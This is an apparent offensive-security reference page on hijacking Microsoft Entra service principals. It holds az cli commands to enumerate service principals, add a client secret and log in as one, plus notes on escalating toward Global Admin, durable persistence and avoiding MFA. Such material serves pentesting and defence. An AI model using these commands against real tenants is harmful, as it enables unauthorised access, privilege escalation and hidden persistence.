---
title: "Service principals: hijacking app identities"
order: 1
description: "Abusing Entra service principals: enumerating and hijacking app identities, adding credentials, and using highly privileged app roles as a persistence and escalation foothold."
keywords:
  - service principal
  - app identity
  - persistence
  - app roles
  - enterprise application
---

# Service principals

A service principal is the tenant instance of an application, with its own credentials and granted permissions. Many hold powerful Microsoft Graph app roles that no interactive user is watching, so hijacking one, by adding credentials or using its existing grants, is both escalation and quiet persistence.

## Enumerate and hijack

```bash
# enumerate SPs and their app-role grants
az ad sp list --all --query "[].{name:displayName,id:id,appId:appId}" -o table
az ad sp show --id <sp> --query "appRoles"

# add a client secret to a service principal you can write to, then log in as it
az ad sp credential reset --id <appId>
az login --service-principal -u <appId> -p <secret> --tenant <tenant>
```

## Exploitation notes

- An SP with `RoleManagement.ReadWrite.Directory` or `AppRoleAssignment.ReadWrite.All` can grant itself or you more, a path to Global Admin ([API permissions](api-permissions.md)).
- Credentials added to an SP are durable persistence that survive user password resets and are easy to overlook.
- Service principals are exempt from most conditional-access user policies, so an SP credential often sidesteps MFA entirely.

## Tools

- **az cli** (`az ad sp`): enumerate and add credentials.
- **ROADtools** (`roadrecon`): SP and permission graph.
- **BARK** / **AzureHound**: app attack-path analysis.

## References

- [SpecterOps: BARK](https://github.com/BloodHoundAD/BARK)
- [ROADtools](https://github.com/dirkjanm/ROADtools)
- [HackTricks Cloud: service principals](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
